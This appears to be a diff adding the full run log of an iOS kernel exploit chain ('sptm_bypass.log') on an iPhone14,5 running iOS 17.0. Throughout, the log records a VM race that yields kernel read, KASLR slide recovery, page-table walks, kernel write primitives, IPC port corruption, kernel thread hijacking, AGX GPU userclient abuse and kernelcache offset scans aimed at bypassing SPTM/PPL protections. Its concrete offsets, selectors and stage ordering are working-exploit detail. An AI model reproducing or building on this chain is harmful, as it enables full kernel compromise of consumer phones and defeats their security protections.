@@ -1,0 +1,979 @@
+Log file: /var/mobile/Containers/Data/Application/863A3FF9-13E8-40CA-91C4-57C1FD2CCEF0/Documents/sptm_bypass.log
+Device:  iPhone14,5
+System:  Darwin 23.0.0
+Build:   21A329
+Model:   D17AP
+PID:     1007  UID: 501  GID: 501
+Task:    0x203
+
+=== EXPLOIT PATH DETECTION ===
+cpufamily:  0xDA33D83D (-634136515)
+cpusubfam:  1
+ncpu:       6
+xnu:        10002.2.11
+kern_ver:   0x27120080B00000
+path:       C (offsets 176/80)
+chip:       0xDA33D83D flag=0x100000 bit5=1
+defrag:     SKIP
+=== END DETECTION ===
+
+=== KREAD BOOTSTRAP ===
+
+[kread] === KREAD BOOTSTRAP START ===
+[kread] spawning bootstrap thread (fresh pthread)...
+[kread] running in fresh pthread (tid=0x1701a3000)
+[kread] exc_guard: 0x0 (no change, kr=0x0)
+[kread] uname.version: Darwin Kernel Version 23.0.0: Thu Aug 24 20:19:26 PDT 2023; root:xnu-10002.2.11~1/RELEASE_ARM64_T8110
+[kread] uname.release: 23.0.0 machine: iPhone14,5
+[kread] step1: init_inner_context...
+[kread] === PLATFORM DETECTION ===
+[kread] cpufamily=0xda33d83d (-634136515) cpusubfamily=1 ncpu=6
+[kread] kern_ver=0x27120080b00000 xnu=10002
+[kread] platform_flag=0x100000 bit5=1
+[kread] path=C (offsets 176/80)
+[kread] should_defrag=0 (binary condition: flag&0x5184001=1, !bit5=0)
+[kread] === END PLATFORM DETECTION ===
+[kread] inner ctx: page_size=16384 page_mask=0x3fff xnu=10002 kern=0x27120080b00000 os=23.0.0
+[kread] step1: init_outer_context...
+[kread] reply ports created
+[kread] heap buffer: 0x108204000 (8388608 bytes)
+[kread] spray ports created
+[kread] outer ctx initialized (28000 bytes)
+[kread] step1: contexts initialized OK
+[kread] kern_ver=0x27120080b00000 path=C (176/80)
+[kread] step2: ctx[0]=0x100020 defrag=SKIP
+[kread] submap verify: base=0x1b0278000 size=0x48000
+[kread] entry test: kr=0x0 port=0x18103 sz=0x48000
+[kread] submap obj_id=0xeab4d602dea64f67
+[kread] mapped obj_id=0xeab4d603c4b3fcb7 (same=0)
+[kread] starting race loop (16 slots)...
+[kread] slot 0: racing...
+[race] submap: 0x1b0278000 size=0x48000
+[race] ncpu=6 threads=4 iters=100 region=0x40000
+[race] iter0: creating mem entry from submap...
+[race] ref_before=7 obj_id=0xeab4d603c41601b7
+[race] i0: 845 loops kr=0x1
+[race] i0: ref 7->8 (exp 8)
+[race] i2: ref 7->7 (exp 8)
+[race] RACE WON iter 2 ref 7->7 (expected 8)
+[race] delta=1 dealloc_count=4/4 parent entries
+[post] target_oid=0xeab4d603c41604b7 pa=0x4000
+[post] probe loop start
+[post] vm_allocate probe 0...
+[post] get_obj_id probe 0 addr=0x107668000...
+[post] probe 0: oid=0xeab4d603c45915b7
+[post] vm_allocate probe 1...
+[post] get_obj_id probe 1 addr=0x102fa4000...
+[post] probe 1: oid=0xeab4d603c415dfb7
+[post] vm_allocate probe 2...
+[post] get_obj_id probe 2 addr=0x102fa8000...
+[post] probe 2: oid=0xeab4d603c415e2b7
+[post] vm_allocate probe 3...
+[post] get_obj_id probe 3 addr=0x102fb8000...
+[post] probe 3: oid=0xeab4d603c39d5ab7
+[race] RACE SUCCESS iter 2 ref 7->7 base=0x2ea000000
+[diag] post-cookie ref=3 oid=0xeab4d603c41604b7 (was ref=7)
+[race] sub_BD20 OK: entry=0x9913
+[diag] cookie=0xc5aa13a6ac7c1e44 base=0x2ea000000 pages=16
+[diag] page[0] val=0xc5aa13a6ac7c1e44 oid=0xeab4d603c41604b7 =cookie
+[diag] page[1] val=0xc5aa13a6ac7c1e44 oid=0xeab4d603c41604b7 =cookie
+[diag] page[2] val=0xc5aa13a6ac7c1e44 oid=0xeab4d603c41604b7 =cookie
+[diag] page[3] val=0xc5aa13a6ac7c1e44 oid=0xeab4d603c41604b7 =cookie
+[race] returning SUCCESS
+[kread] slot 0: race returned 0x0
+[kread] slot 0: race SUCCESS, base=0x2ea000000 size=0x40000 pages=16
+[kread] slot 0: detecting aliases...
+[alias] start: vm_region=0x108000000 race_base=0x2ea000000 pages=16 max=262144
+[alias] cookie=0xc5aa13a6ac7c1e44 mask=0x0
+[alias] pre[0] val=0xc5aa13a6ac7c1e44 =cookie
+[alias] pre[1] val=0xc5aa13a6ac7c1e44 =cookie
+[alias] pre[2] val=0xc5aa13a6ac7c1e44 =cookie
+[alias] pre[3] val=0xc5aa13a6ac7c1e44 =cookie
+[alias] MATCH page 9 at attempt 6823
+[kread] slot 0: ALIAS DETECTED, grooming...
+[groom] stride=256 struct_off=176 kptr_off=80 vfield=0x10000000800 mask=0x200 cnt=2097152
+[kread] slot 0: kernel structure found
+[kread] finding OOL mapping...
+[ool] slot 0: scanning 16 pages base=0x2ea000000
+[ool] FOUND vm_map_entry at slot 0 page 12 off 64
+[ool] receive phase: port_idx=0
+[ool] recv 1: entry[2]=0x1089dc000 ool=0x10929c000+0x800000
+[ool] recv 2: entry[2]=0x1089dc000 ool=0x10929c000+0x800000
+[ool] recv 3: entry[2]=0x1089dc000 ool=0x10929c000+0x800000
+[ool] OOL MATCH at recv 271 addr=0x109288000 size=0x800000
+[kread] === KREAD BOOTSTRAP COMPLETE ===
+[kread] kptr = 0xffffffe9978adbb0
+[kread] map_entry = 0x2ea030040
+[kread] map_hdr = 0x2ea030090
+[kread] TEST READ: kread64(0xffffffe9978adbb0) = 0x822000000
+[kread] KASLR slide = 0x414f4000
+[kread] VA<->PA OK: kern_task 0xfffffff06b7917d0 -> PA 0x8088297d0
+[kread] PTE: task+16 stripped = 0xffffffe996091480
+[kread] PTE: walking task list from 0xffffffe996091480
+[kread] PTE: kernel task node at 0xffffffe996093cd0
+[kread] PTE: target (found+24) = 0xffffffe995f6c580
+[kread] PTE: v22 (ctx+6616) = 0xffffffe996094400
+[kread] PTE: v22+40 = 0xffffffe85ffeebb0 (kptr)
+[kread] PTE: ptr1+64 = 0xfffffff06b792180 (kptr)
+[kread] PTE: pmap[0]=0xfffffff048518000 pmap[8]=0x808518000
+[kread] PTE walk INIT OK: tte=0xfffffff048518000 ttep=0x808518000
+[kread] segment table (15 entries):
+[kread]   [0] phys=0x808a5c000 virt=0xfffffff06c000000 size=0xdcee8000
+[kread]   [1] phys=0x8022e0000 virt=0xfffffff148ee8000 size=0x3138000
+[kread]   [2] phys=0x805480000 virt=0xfffffff069218000 size=0x2310000
+[kread]   [3] phys=0x807790000 virt=0xfffffff0684f8000 size=0xd20000
+[kread]   [4] phys=0x8085c0000 virt=0xfffffff14e0c4000 size=0x1d4000
+[kread]   [5] phys=0x8088c4000 virt=0xfffffff06b82c000 size=0x11c000
+[kread]   [6] phys=0x8084b0000 virt=0xfffffff0484b0000 size=0x108000
+[kread]   [7] phys=0x8087d4000 virt=0xfffffff06b73c000 size=0xac000
+[kread]   [8] phys=0x8089e0000 virt=0xfffffff14e048000 size=0x7c000
+[kread]   [9] phys=0x805418000 virt=0xfffffff0584f8000 size=0x54000
+[kread]   [10] phys=0x808880000 virt=0xfffffff14e004000 size=0x44000
+[kread]   [11] phys=0x808794000 virt=0xfffffff06b6fc000 size=0x3c000
+[kread]   [12] phys=0x80546c000 virt=0xfffffff06b9c4000 size=0x14000
+[kread]   [13] phys=0x8085b8000 virt=0xfffffff05854c000 size=0x8000
+[kread]   [14] phys=0x8087d0000 virt=0xfffffff14e000000 size=0x4000
+[kread] tte_pa=0x808518000 tte_va=0xfffffff048518000
+[kread] bootstrap thread completed: 0
+
+KREAD BOOTSTRAP SUCCESS
+
+=== entry1 BOOTSTRAP: kernel R/W primitives ===
+[kwrite] === KWRITE PRIMITIVE TEST ===
+[kwrite] groom=0x2ea02f400 mem_entry=0x59a27 page_mask=0x3fff
+[kwrite] tickle: kr=0x0 flags@116=0x11c800
+[kwrite] kernel_task kva=0xfffffff06b7917d0 -> pa=0x8088297d0
+[kwrite] kread64(kernel_task) = 0x0
+[kwrite] verify: via_map=0x0 via_kread=0x0 match=1
+[kwrite] step 1 OK: PA redirect + vm_map + verify
+[kwrite] kwrite64: mapped=0x102f1c000 off=0x17d0 val=0x0 about to write...
+[kwrite] kwrite64_phys: wrote 0x0, readback 0x0, match=1
+[kwrite] step 2 OK: kwrite64_phys round-trip
+[kwrite] === KWRITE PRIMITIVE TEST COMPLETE ===
+kwrite primitive OK; setting up port corruption (label372)...
+[l372] === LABEL_372 SETUP START ===
+[l372] named entry port = 0x170b (size=0x4000)
+[port] port=0x170b -> ipc_port=0xffffffed2b09dc90
+[l372] ipc_port kva = 0xffffffed2b09dc90
+[l372] v173 (kobject) = 0xffffffea7b0becc0
+[l372] v176 (kobject PA) = 0x8a4842cc0
+[l372] v177 (deep resolved) = 0xffffffe9461ea200
+[l372] handlec (deep PA) = 0x8cf32a200
+[l372] ctx_A (pre-redirect): 0xfffffff06b7917d0
+[l372] redirected groom to v177 PA page 0x8cf328000
+[l372] v179 (mapped deep obj) = 0x102f1e200 (off=0x2200)
+[l372] v179 validate: [0]=0x35187a88 [4]=0x35187a88 [24]=0x4000 (expect page_size=0x4000)
+[l372] v177 flags@116 = 0x11c800
+[l372] v177 modified: flags=0x111c880 PA=0 size=-1
+[l372] ctx_B (post v177 modify): 0xfffffff06b7917d0
+[l372] redirected groom to v173 PA page 0x8a4840000
+[l372] v181 (mapped kobject) = 0x102f1ecc0 (off=0x2cc0)
+[l372] v181 validate: [32]=0x4000 (expect page_size=0x4000)
+[l372] v173 modified: size@32 = -1
+[l372] ctx_C (post v173 modify): 0xfffffff06b7917d0
+[l372] ctx_check: kern_task_kva=0xfffffff06b7917d0
+[l372] === LABEL_372 SETUP COMPLETE (port=0x170b) ===
+label372 OK (port=0x170b); hijacking kernel thread (VM-race)...
+[hijack] === PPL_RACE_THREAD_HIJACK START ===
+[locate] TEXT_EXEC: virt=0xfffffff068c18000 size=0x2310000
+[locate] scanning 0xfffffff06af08000-0xfffffff06af28000 for pattern 1...
+[locate] not in last 0x20000, scanning full TEXT_EXEC...
+[locate] pattern 1 at 0xfffffff06994d404
+[locate] ref1=0xfffffff068d613c0 ref2=0xfffffff06b792428
+[locate] dev_mode: pa=0x809c2c000 off=10772928
+[locate] scanning 0xfffffff06992d404-0xfffffff06996d404 for pattern 2...
+[locate] pattern 2 at 0xfffffff06994e098
+[locate] pat2-8: 0xf0ffa315  pat2-4: 0x911a62b5
+[locate] percpu_ref=0xfffffff068db1698 raw=0xe7764000
+[locate] MH at KC+0x0: type=12
+[locate] MH at KC+0x8000: type=2
+[locate] kernel MH at 0xfffffff068500000: magic=0xfeedfacf ncmds=27
+[locate] __DATA at 0xfffffff068d50000 nsects=7
+[locate]   sect[0]: 0x75615f5f 0x705f6874
+[locate]   sect[1]: 0x6f6d5f5f 0x6e695f64
+[locate]   sect[2]: 0x6f635f5f 0x0074736e
+[locate]   sect[3]: 0x69685f5f 0x6f635f62
+[locate] __DATA at 0xfffffff06b6fc000 nsects=1
+[locate]   sect[0]: 0x6f635f5f 0x0074736e
+[locate] __DATA at 0xfffffff06b73c000 nsects=5
+[locate]   sect[0]: 0x61645f5f 0x00006174
+[locate]   sect[1]: 0x6f6c5f5f 0x675f6b63
+[locate]   sect[2]: 0x65705f5f 0x75706372
+[locate] __percpu: va=0xfffffff06b75c000 size=0x4de0
+[locate] percpu_table = 0xe7764000 + 0xfffffff06b75c000 = 0xfffffff152ec0000
+[locate] kva_to_pa(percpu_table) = 0x809ac4000
+[locate] percpu: pa=0x809ac4000 stride=32768
+[hijack] locate_dev_mode: 0 percpu_pa=0x809ac4000
+[hijack] ncpu=6 stride=32768
+[hijack] per-CPU mapped at 0x109ba0000 size=0x28000
+[hijack] percpu[1] at offset 0x45f0
+[hijack] percpu[2] at offset 0xc5f0
+[hijack] percpu[3] at offset 0x145f0
+[hijack] percpu[4] at offset 0x1c5f0
+[hijack] percpu[5] at offset 0x245f0
+[hijack] spawning 12 workers...
+[worker] dm[0]: page=0x8394000 mark=1370350739 (want 0xffffffec4905c000)
+[worker] dm[1]: page=0x8398000 mark=1370350739 (want 0xffffffec4905c000)
+[worker] dm[2]: page=0xffffffdebbf48000 mark=1370355075 (want 0xffffffec4905c000)
+[worker] MATCH at entry 210963 off=0x9a8390
+[hijack] workers done. found_thread=0x16fe5b000 found_kva=0xffffffec4905c388
+[hijack] found_kva=0xffffffec4905c388 found_offset=0x8d86c0440
+[hijack] thread+184 = 0xffffffe996f27a90
+[hijack] === PPL_RACE_THREAD_HIJACK COMPLETE (thread+256=0xffffffe996f27a90) ===
+thread hijack OK; installing kread/kwrite primitives...
+[krw] === INIT_KERNEL_RW_PRIMITIVES ===
+[port] port=0x5914f -> ipc_port=0xffffffed2ad24fa0
+[krw] attempt 0: worker thread kva = 0xffffffec48e468a8 OK
+[krw] mapped thread at 0x102fae8a8 (page 0x102fac000)
+[krw] displacement = 1208 (0x4b8)
+[krw] processor pattern at 0xfffffff069276024
+[krw] processor array at 0xfffffff06b792838
+[krw] cpu0: proc=0xfffffff06b760028 state=1
+[krw] cpu1: proc=0xfffffff152ec4028 state=1
+[krw] cpu2: proc=0xfffffff152ecc028 state=1
+[krw] cpu3: proc=0xfffffff152ed4028 state=1
+[krw] cpu4: proc=0xfffffff152edc028 state=2
+[krw] cpu5: proc=0xfffffff152ee4028 state=2
+[krw] using processor 0xfffffff152edc028
+[krw] thread+536 existing = 0x0
+[krw] wrote proc addr to thread+536
+[krw] sched: thread+380=3 thread+460=0
+[krw] flag: thread+404=31
+[krw] execute_complex_processor_operation OK
+[krw] thread+144 (v30=144) = 0xffffffe996938a00
+[krw] thread+1304 (disp+96) = 0xffffffe996938a00
+[krw] thread+1328 (disp+96+24) = 0xffffffec48e46da0
+[krw] kread verify: vm_region=0x822000000 ts=0x822000000 match=1
+[krw] === INIT_KERNEL_RW_PRIMITIVES COMPLETE ===
+kread/kwrite primitives installed; running post-init...
+[setup] === POST_INIT_SETUP ===
+[port] port=0xa03 -> ipc_port=0xffffffed2d7ca470
+[setup] host port KVA = 0xffffffed2d7ca470
+[setup] host port type = 3 (raw=0x80000003)
+[setup] kern_task_kva = 0xfffffff06b7917d0
+[setup] kern_task[0] = 0x0
+[setup] === POST_INIT_SETUP COMPLETE ===
+post-init OK; running pa_redirect-based mapping test...
+[port_persist] === PORT PERSISTENCE START ===
+[port_persist] shared page: kt=0xfffffff06b7917d0 dm=0x809c2c000 pc=0x809ac4000
+[port_persist] all_image_info = 0x20969b200
+[port_persist] iter 0: port=0x170b
+[port] port=0x170b -> ipc_port=0xffffffed2b09dc90
+[port_persist] ipc_port KVA = 0xffffffed2b09dc90
+[dch] port+4: 3 -> 4 (kr=0)
+[dch] port+128: 1 -> 2 (kr=0)
+[port_persist] wrote port 0x170b to slot0 at 0x20969b300
+[port_persist] iter 1: port=0x1cc47
+[port] port=0x1cc47 -> ipc_port=0xffffffed2ba26f20
+[port_persist] ipc_port KVA = 0xffffffed2ba26f20
+[dch] port+4: 3 -> 4 (kr=0)
+[dch] port+128: 1 -> 2 (kr=0)
+[port_persist] wrote port 0x1cc47 to slot1 at 0x20969b304
+[itc] worker[112] unset -> transport channel skipped
+[port_persist] === PORT PERSISTENCE COMPLETE ===
+pa_redirect mapping OK; verifying kernel R/W...
+[rwcheck] === KERNEL R/W SELF-TEST ===
+[rwcheck] DATA page: map=0x822000000 kread=0x822000000 match=1
+[rwcheck] WRITE test: orig=0x822000000 wrote=0x4141414963414141 readback=0x4141414963414141 restored
+[rwcheck] === kernel data write OK ===
+[rwcheck] === SELF-TEST COMPLETE ===
+=== kernel R/W verified ===
+[necp_handle] === INIT_NECP_KERNEL_HANDLE ===
+[necp_handle] suspended thread port=0x7ba53
+[port] port=0x7ba53 -> ipc_port=0xffffffed2b09d390
+[necp_handle] thread KVA = 0xffffffec489317b0
+[necp_handle] using offset=184 (thread+184)
+[necp_handle] thread+184 = 0xffffffe9971de6b0
+[necp_handle] field PA = 0x86f8866b0
+[necp_handle] mapped_field=0x102fbe6b0 val=0x8400000017
+[necp_handle] === INIT_NECP_KERNEL_HANDLE COMPLETE ===
+NECP-based kwrite handle: 0
+[kw_test] === KERNEL DATA WRITE TEST ===
+[kw_test] write=0x22000010 rb=0x22000010 restore=0x22000000 ok=1
+[kw_test] === KERNEL DATA WRITE OK ===
+=== NECP kwrite primitive verified ===
+
+=== SPTM BYPASS: setup ===
+Userclient: opening AGX userclient + IOConnect setup...
+[uc_test] === AGX USERCLIENT SETUP TEST (Userclient) ===
+[agx_uc] matched IOGPU service: 0x5974f
+[agx_uc] IOServiceOpen(type=1) OK: connect=0x7be2f
+[agx_uc] sel 7  OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0xF OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0x19 OK
+[agx_uc] sel 0xD #1 OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0xD #2 OK: handle=0x2
+[agx_uc] sel 0x1A #1 OK
+[agx_uc] sel 0x1A #2 OK
+[agx_uc] setup complete (7 selectors)
+[uc_test] all 7 selectors returned success.
+[uc_test] handles: sel7=0x1 selF=0x1 selD0=0x1 selD1=0x2
+[uc_test] === Userclient COMPLETE -- userclient armed ===
+Userclient OK (userclient armed)
+Kext locate: locating IOGPUFamily kext in kernelcache...
+[kcb] === Kext locate: LOCATE IOGPU KEXT ===
+[kcb] kt_kva=0xfffffff06b7917d0 -> kc_base=0xfffffff0684f8000
+[kcfse] MH @ 0xfffffff0684f8000: magic=0xfeedfacf ft=12 ncmds=255 sz=0x4720
+[kcfse] FOUND prefix='com.apple.iokit.IOGPUFamily'(27) -> 'com.apple.iokit.IOGPUFamily' vmaddr=0xfffffff068a98da0 (entry 186)
+[kcb] IOGPU MH: magic=0xfeedfacf ft=11 ncmds=9
+[kcb]   seg[0] '__TEXT' vmaddr=0xfffffff068a98da0 vmsize=0x7644
+[kcb]   seg[1] '__TEXT_EXEC' vmaddr=0xfffffff06ad67220 vmsize=0x30378
+[kcb]   seg[2] '__DATA' vmaddr=0xfffffff06b8fbcb8 vmsize=0xb41
+[kcb]   seg[3] '__DATA_CONST' vmaddr=0xfffffff0690e9680 vmsize=0x7e80
+[kcb]   seg[4] '__LINKEDIT' vmaddr=0xfffffff06b990000 vmsize=0x2fe21
+[kcb] === Kext locate OK ===
+Kext locate OK (IOGPU kext located)
+Kcache scan: kcache pattern scans (extracting 13 struct offsets)...
+[kcb2] === Pattern scan: PATTERNS 1,2,3 SCAN ===
+[kcfse] MH @ 0xfffffff0684f8000: magic=0xfeedfacf ft=12 ncmds=255 sz=0x4720
+[kcfse] FOUND prefix='com.apple.iokit.IOGPUFamily'(27) -> 'com.apple.iokit.IOGPUFamily' vmaddr=0xfffffff068a98da0 (entry 186)
+[load_te:iogpu] __TEXT_EXEC vaddr=0xfffffff06ad67220 vsize=0x30378
+[load_te:iogpu] reading 197496 bytes via kread...
+[load_te:iogpu] loaded: first insns 0xd503237f 0xa9bf7bfd 0x910003fd
+[kcfse] MH @ 0xfffffff0684f8000: magic=0xfeedfacf ft=12 ncmds=255 sz=0x4720
+[kcfse] FOUND prefix='com.apple.AGXG'(14) -> 'com.apple.AGXG14P' vmaddr=0xfffffff0685c4c20 (entry 4)
+[load_te:agxg] __TEXT_EXEC vaddr=0xfffffff06995a750 vsize=0x9ea54
+[load_te:agxg] reading 649812 bytes via kread...
+[load_te:agxg] loaded: first insns 0xd503245f 0x9000f6a8 0x9106a108
+[kcb2] P1 idx=3479 (kva=0xfffffff06ad6a87c) insn[2]=0xf9409008 -> v4[42]=0x120
+[kcb2] P2 MOVK at idx=46387 insn=0xf2f5f031 -- walking for STR XZR...
+[kcb2] P2 STR XZR at idx=46389 (Delta2) insn=0xf900167f -> v4[43]=0x28
+[kcb2] P3 idx=36618 (kva=0xfffffff06997e378)
+[kcb2]   insns: [0]=0xf940af28 [1]=0xb4002ee8 [2]=0xf940273b [3]=0xb95c6f69 [4]=0x34002e89
+[kcb2]   -> v4[46]=0x158 v4[44]=0x48 v4[45]=0x1c6c
+[kcb2] P4 idx=36633 (kva=0xfffffff06997e3b4) insn[0]=0x5290aa08 -> v4[49]=0x8550
+[kcb2] P5 2nd MOV W8 at idx=36629 (Delta-4) insn=0x52800c08 -> v4[47]=0x60
+[kcb2] P5 marker at idx=36650 (Delta21 from MOV2) insn[+3]=0x8b140809 -> v4[48]=0x1408
+[kcb2] P6 match=28400 BL=28425 (Delta25) insn[BL-2]=0xf9403ee0 -> v4[50]=0x78
+[kcb2] P7 idx=1339 insn[0]=0xf9000a60 -> v4[51]=0x10
+[kcb2] P8 idx=12245 insn[+3]=0xf9401a60 -> v4[52]=0x30
+[xnu] MH @ kc+0x0 ft=12
+[xnu] MH @ kc+0x8000 ft=2
+[load_te:xnu] __TEXT_EXEC vaddr=0xfffffff069218000 vsize=0x738000
+[load_te:xnu] reading 7569408 bytes via kread...
+[load_te:xnu] loaded: first insns 0xd503237f 0xa9be4ff4 0xa9017bfd
+[kcb2] P9 idx=1688969 insn[0]=0xf9401408 -> v4[53]=0x28
+[kcb2] P10 match idx=51196 (kva=0xfffffff06998c740) -- walking back for ADRP...
+[kcb2]   step=4 idx=51192 insn=0xf0ffa450 kva=0xfffffff06998c730 -> resolve=0xfffffff068e17608
+[kcb2] P10 -> v4[27] = 0xfffffff068e17608
+[kcb2] === Kcache scan COMPLETE -- 13/13 attempts done ===
+[kcb2] v4: 42=0x120 43=0x28 44=0x48 45=0x1c6c 46=0x158 47=0x60 48=0x1408 49=0x8550 50=0x78 51=0x10 52=0x30 53=0x28
+[kcb2]     v27 = 0xfffffff068e17608
+[kcb2] 13 of 13 offsets verified
+Kcache scan OK (offsets extracted)
+
+=== SPTM BYPASS: full pipeline (setup -> firmware bring-up -> resolve -> forge -> kwrite) ===
+[agx] === AGX FULL PIPELINE: userclient setup + structure walk ===
+[agx_uc] matched IOGPU service: 0x53b27
+[agx_uc] IOServiceOpen(type=1) OK: connect=0x58c63
+[agx] submit UC = OWN (connect=0x58c63)
+[agx_uc] sel 7  OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0xF OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0x19 OK
+[agx_uc] sel 0xD #1 OK: handle=0x1 (out_cnt=16)
+[agx_uc] sel 0xD #2 OK: handle=0x2
+[agx_uc] sel 0x1A #1 OK
+[agx_uc] sel 0x1A #2 OK
+[agx_uc] setup complete (7 selectors)
+[agx] uc handles: connect=0x58c63 sel7=0x1 selD0=0x1 selD1=0x2
+[walk] === SETUP: STRUCTURE WALK + GPU BUFFER MAP ===
+[port] port=0x58c63 -> ipc_port=0xffffffed2bce1e40
+[walk] port=0x58c63 ipc_port=0xffffffed2bce1e40 kobj_raw=0xffffffea7b484de8 kobj(+48)=0xffffffeb5c2880c0
+[walk] step1 = *(0xffffffeb5c2880c0 + 0x120) = 0xffffffea7cdd5e00
+[walk] v299  = *(step1 + 0x78) = 0xffffffe9970c8b00
+[walk] v298  = *(v299  + 0x10) = 0xffffffec45e08000
+[walk] v297  = *(v298  + 8*0x1 = +0x8) = 0xffffffec4644ff00
+[walk] v296  = *(v298  + 8*0x2 = +0x10) = 0xffffffec4644ca00
+[walk] v295  = *(v297  + 0x30) = 0xffffffeb5b3e19d8
+[walk] v294  = *(v296  + 0x30) = 0xffffffeb5b3e21c0
+[walk] buf1_kva = *(v295 + 0x28) = 0xffffffe85ae14000
+[walk] buf2_kva = *(v294 + 0x28) = 0xffffffe85ae60000
+[walk] buf1_pa = 0x8dc7f0000 (page-aligned 0x8dc7f0000)
+[walk] buf2_pa = 0x8b6e34000 (page-aligned 0x8b6e34000)
+[port] port=0x5986b -> ipc_port=0xffffffed2aa6a740
+[port] port=0x854f -> ipc_port=0xffffffed2bb6ebc0
+[kobj_find] recv_ipc=0xffffffed2bb6ebc0 v27=0xffffffed2bb6ec20
+[kobj_find] SUCCESS: addr=0xffffffed2c3c8900 size=64 (need 64)
+[ppl] mapped PA=0x8dc7f0000 -> user 0x102ffc000 (kobj=0xffffffed2c3c8900)
+[walk] buf1 mapped at user VA 0x102ffc000 (kobj=0xffffffed2c3c8900)
+[port] port=0xa35f -> ipc_port=0xffffffed2ace8850
+[port] port=0xa13b -> ipc_port=0xffffffed2b5e7d30
+[kobj_find] recv_ipc=0xffffffed2b5e7d30 v27=0xffffffed2b5e7d90
+[kobj_find] SUCCESS: addr=0xffffffed2c3c8640 size=64 (need 64)
+[ppl] mapped PA=0x8b6e34000 -> user 0x107614000 (kobj=0xffffffed2c3c8640)
+[walk] buf2 mapped at user VA 0x107614000 (kobj=0xffffffed2c3c8640)
+[walk] === SETUP OK -- GPU buffers mapped RW ===
+[own] mode=EARLY-PROBE (pre-bypass, NO publish)
+[own] === own-channel serve === continuous keepalive running (submits=4808)
+[own] our_task=0xffffffe9978adbb0 ipc_space=0xffffffea7bd797b0 ipc_table=0xffffffe057f68000 entries=2730 A1VT=0xfffffff068e172d0 (sel7=0x1)
+[port] port=0x58c63 -> ipc_port=0xffffffed2bce1e40
+[own] want_vt(our leaf UC class)=0xfffffff068e17618
+[own]  port[78] kobj=0xffffffea7b4797f8 dev=0xffffffeb63fe43a0 leaf_vt=0xfffffff0691534f8 cont=0x0(BAD)
+[own]  port[1420] kobj=0xffffffea7b484de8 dev=0xffffffeb5c2880c0 leaf_vt=0xfffffff068e17618(==want) cont=0xffffffea7cdd5e00
+[own]   dev+0x110..130: +110=0xffffffeb5b3e2d70 +118=0x0 +120=0xffffffea7cdd5e00 +128=0x0 +130=0x0 | cont+0x80..A8: +80=0xffffffe9970c7280 +88=0xffffffe9970c8a40 +90=0xffffffe9970c8a80 +98=0x0 +a0=0x0 +a8=0x0
+[own] cont=0xffffffea7cdd5e00 LT+0x80 array=0xffffffec45ebe000 cnt=1024 nonnull-A1VT=0 -> 0 wq-bearing (leaf_vt == want)
+[own]    LT+0x88 arr[1] cq=0xffffffeb6264b000 wqcount(+0x88C)=0 pool=0x0/0x0/0x0
+[own] cont=0xffffffea7cdd5e00 LT+0x88 array=0xffffffec45cac000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own] cont=0xffffffea7cdd5e00 LT+0x90 array=0xffffffec45cae000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own]  port[1972] kobj=0xffffffea7b479718 dev=0xffffffeb5c287de0 leaf_vt=0xfffffff068e17618(==want) cont=0xffffffea7cdd6c00
+[own]   dev+0x110..130: +110=0xffffffeb5b3e2270 +118=0x0 +120=0xffffffea7cdd6c00 +128=0x10 +130=0x0 | cont+0x80..A8: +80=0xffffffe9970c1640 +88=0xffffffe9970c1480 +90=0xffffffe9970c14c0 +98=0x0 +a0=0x0 +a8=0x0
+[own] cont=0xffffffea7cdd6c00 LT+0x80 array=0xffffffec45caa000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own]    LT+0x88 arr[1] cq=0xffffffeb62645000 wqcount(+0x88C)=0 pool=0xffffffea7ba159c0/0x0/0x0
+[own] cont=0xffffffea7cdd6c00 LT+0x88 array=0xffffffec45e04000 cnt=1024 nonnull-A1VT=1 -> 5 wq-bearing (leaf_vt == want)
+[own] cont=0xffffffea7cdd6c00 LT+0x90 array=0xffffffec45ec6000 cnt=1024 nonnull-A1VT=1 -> 0 wq-bearing (leaf_vt == want)
+[own] IPC walk: active-IKOT0x1D=3 kobj_ok=3 dev_ok=3 cont_ok=2 uniq_conts=2 -> 5 candidate channels
+[own] cand[0] regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460(wq+0x1e8) +0x78 0x411->0x23c ADVANCED
+[own] cand[1] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x1f0) +0x78 0x314->0x4c6 ADVANCED
+[own] cand[2] regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460(wq+0x1e8) +0x78 0x411->0x2aa ADVANCED
+[own] cand[3] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x1f0) +0x78 0x314->0x9e ADVANCED
+[own] cand[4] regid=1 cq=0xffffffeb62645000 ch=0xffffffed2b8883a0(wq+0x858) +0x78 0x314->0xee ADVANCED
+[own] picked queue (advanced under continuous keepalive): regid=1 cq=0xffffffeb62645000 ch=0xffffffec495c8460 (wq+0x1e8)
+[own] EARLY PROBE: workqueue+channel found under continuous keepalive. NO publish (zero_wp not ready).
+[own] continuous keepalive stopped (total submits=7282)
+[agx] buf1[0..15]: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[agx] buf2[0..15]: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+[agx] -> running firmware bring-up probe with GPU active...
+[bringup] === AGX FIRMWARE MMIO PROBE ===
+[bringup] flag check: ctx[0]&0x4000000 = 0 (we use PA 0x206050000)
+[bringup] flag check: ctx[0]&0x5000000 = 0 (we use mask 0xFFFFFFFFE)
+[bringup] mapping AGX firmware MMIO at 0x206050000...
+[port] port=0x9c6b -> ipc_port=0xffffffed2b9dace0
+[port] port=0xaa647 -> ipc_port=0xffffffed2b07c970
+[kobj_find] recv_ipc=0xffffffed2b07c970 v27=0xffffffed2b07c9d0
+[kobj_find] SUCCESS: addr=0xffffffed2c3c4a00 size=64 (need 64)
+[ppl] mapped PA=0x206050000 -> user 0x102fe8000 (kobj=0xffffffed2c3c4a00)
+[bringup] mapped at user VA 0x102fe8000 (kobj=0xffffffed2c3c4a00)
+[bringup] reading 8 bytes from MMIO+0...
+[bringup] *(0x206050000+0) = 0x80063c001
+[bringup] masked (v45 = v42 & 0xFFFFFFFFE) = 0x80063c000
